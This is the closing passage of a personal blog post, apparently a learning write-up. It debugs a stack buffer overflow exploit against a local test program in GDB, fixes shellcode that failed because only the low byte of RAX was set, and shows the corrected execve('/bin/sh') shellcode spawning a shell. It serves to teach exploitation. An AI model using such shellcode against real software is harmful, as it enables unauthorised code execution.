+</span></span></code></pre></div><p>This actually resulted in a weird behaviour where GDB jumps from <code>0x00007fffffffdde3</code> to <code>0x00007fffffffddeb</code> directly, showing <code>syscall</code> was possibly skipped. But the value of <code>$rax</code> being <code>-38</code> shows its a valid error code, <code>ENOSYS</code> (Function not implemented).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>0x00007fffffffddd4 in ?? <span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> ni
+</span></span><span style=display:flex><span>0x00007fffffffddde in ?? <span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p $rax
+</span></span><span style=display:flex><span>$9 <span style=color:#f92672>=</span> <span style=color:#ae81ff>7526411553527181103</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> ni
+</span></span><span style=display:flex><span>Warning:
+</span></span><span style=display:flex><span>Cannot insert breakpoint 0.
+</span></span><span style=display:flex><span>Cannot access memory at address 0x68732f6e69622f2f
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>0x00007fffffffdddf in ?? <span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p $rax
+</span></span><span style=display:flex><span>$10 <span style=color:#f92672>=</span> <span style=color:#ae81ff>7526411553527181103</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> ni
+</span></span><span style=display:flex><span>0x00007fffffffdde2 in ?? <span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> ni
+</span></span><span style=display:flex><span>Warning:
+</span></span><span style=display:flex><span>Cannot insert breakpoint 0.
+</span></span><span style=display:flex><span>Cannot access memory at address 0x0
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>0x00007fffffffdde3 in ?? <span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> ni
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Program received signal SIGSEGV, Segmentation fault.
+</span></span><span style=display:flex><span>0x00007fffffffddeb in ?? <span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p $rsi
+</span></span><span style=display:flex><span>$11 <span style=color:#f92672>=</span> <span style=color:#ae81ff>140737488346688</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p $rdi
+</span></span><span style=display:flex><span>$12 <span style=color:#f92672>=</span> <span style=color:#ae81ff>140737488346704</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p $rdx
+</span></span><span style=display:flex><span>$13 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> ni
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Program terminated with signal SIGSEGV, Segmentation fault.
+</span></span><span style=display:flex><span>The program no longer exists.
+</span></span></code></pre></div><p>It turns out we are not passing the actual syscall number <code>58</code> in <code>$rax</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>0x7fffffffddd4:  movabs rax,0x68732f6e69622f2f  ← RAX gets <span style=color:#e6db74>&#34;//bin/sh&#34;</span>
+</span></span><span style=display:flex><span>0x7fffffffddde:  push   rax
+</span></span><span style=display:flex><span>0x7fffffffdddf:  mov    rdi,rsp
+</span></span><span style=display:flex><span>0x7fffffffdde2:  push   rdx
+</span></span><span style=display:flex><span>0x7fffffffdde3:  push   rdi
+</span></span><span style=display:flex><span>0x7fffffffdde4:  mov    rsi,rsp
+</span></span><span style=display:flex><span>0x7fffffffdde7:  mov    al,0x3b    ← Only sets AL <span style=color:#f92672>(</span>low byte<span style=color:#f92672>)</span>, not full RAX!
+</span></span><span style=display:flex><span>0x7fffffffdde9:  syscall
+</span></span></code></pre></div><p>Instead now we use</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mov rax, <span style=color:#ae81ff>59</span>           <span style=color:#75715e># Just set the whole register directly</span>
+</span></span></code></pre></div><p>This shows the exploit worked</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/25ib 0x7fffffffddd0
+</span></span><span style=display:flex><span>   0x7fffffffddd0:	xor    rdx,rdx
+</span></span><span style=display:flex><span>   0x7fffffffddd3:	push   rdx
+</span></span><span style=display:flex><span>   0x7fffffffddd4:	movabs rbx,0x68732f6e69622f2f
+</span></span><span style=display:flex><span>   0x7fffffffddde:	push   rbx
+</span></span><span style=display:flex><span>   0x7fffffffdddf:	mov    rdi,rsp
+</span></span><span style=display:flex><span>   0x7fffffffdde2:	push   rdx
+</span></span><span style=display:flex><span>   0x7fffffffdde3:	push   rdi
+</span></span><span style=display:flex><span>   0x7fffffffdde4:	mov    rsi,rsp
+</span></span><span style=display:flex><span>   0x7fffffffdde7:	mov    rax,0x3b
+</span></span><span style=display:flex><span>   0x7fffffffddee:	syscall
+</span></span><span style=display:flex><span>   0x7fffffffddf0:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf1:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf2:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf3:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf4:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf5:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf6:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf7:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf8:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf9:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddfa:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddfb:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddfc:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddfd:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddfe:	rex.B
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> c
+</span></span><span style=display:flex><span>Continuing.
+</span></span><span style=display:flex><span>process <span style=color:#ae81ff>4012</span> is executing new program: /usr/bin/dash
+</span></span><span style=display:flex><span>Warning:
+</span></span><span style=display:flex><span>Cannot insert breakpoint 1.
+</span></span><span style=display:flex><span>Cannot access memory at address 0x401178
+</span></span><span style=display:flex><span>Cannot insert breakpoint 2.
+</span></span><span style=display:flex><span>Cannot access memory at address 0x40119a
+</span></span></code></pre></div><p>Outside of GDB</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./vuln &lt; payload.bin
+</span></span><span style=display:flex><span>buffer is at 0x7fffffffded0
+</span></span><span style=display:flex><span>buffer is H1�RH�//bin/shSH��RWH��H��;
+</span></span><span style=display:flex><span>$ ./vuln &lt; payload.bin
+</span></span><span style=display:flex><span>buffer is at 0x7fffffffded0
+</span></span><span style=display:flex><span>buffer is H1�RH�//bin/shSH��RWH��H��;
+</span></span><span style=display:flex><span>$ <span style=color:#f92672>(</span>cat payload.bin; cat<span style=color:#f92672>)</span> | ./vuln
+</span></span><span style=display:flex><span>buffer is at 0x7fffffffded0
+</span></span><span style=display:flex><span>ls
+</span></span><span style=display:flex><span>buffer is H1�RH�//bin/shSH��RWH��H��;
+</span></span><span style=display:flex><span>ls
+</span></span><span style=display:flex><span>a.out  main.c  payload.bin  payload.py	payload2.py  payload3.py  shellcode  shellcode.asm  shellcode.c  shellcode.o  trace.txt  vuln
+</span></span><span style=display:flex><span>ls
+</span></span><span style=display:flex><span>a.out  main.c  payload.bin  payload.py	payload2.py  payload3.py  shellcode  shellcode.asm  shellcode.c  shellcode.o  trace.txt  vuln
+</span></span><span style=display:flex><span>pwd
+</span></span><span style=display:flex><span>/home/sanketh/assembly/vuln/buffer_overflow/stack_based_buffer_overflow/smashing_stack_for_fun_and_profit/exploit3
+</span></span><span style=display:flex><span>whoami
+</span></span><span style=display:flex><span>sanketh
+</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://sankethbk.github.io/blog/tags/vulnerabilities/>Vulnerabilities</a></li><li><a href=https://sankethbk.github.io/blog/tags/buffer-overflow/>Buffer Overflow</a></li><li><a href=https://sankethbk.github.io/blog/tags/reverse-engineering/>Reverse Engineering</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://sankethbk.github.io/blog/>Sanketh's Blog</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
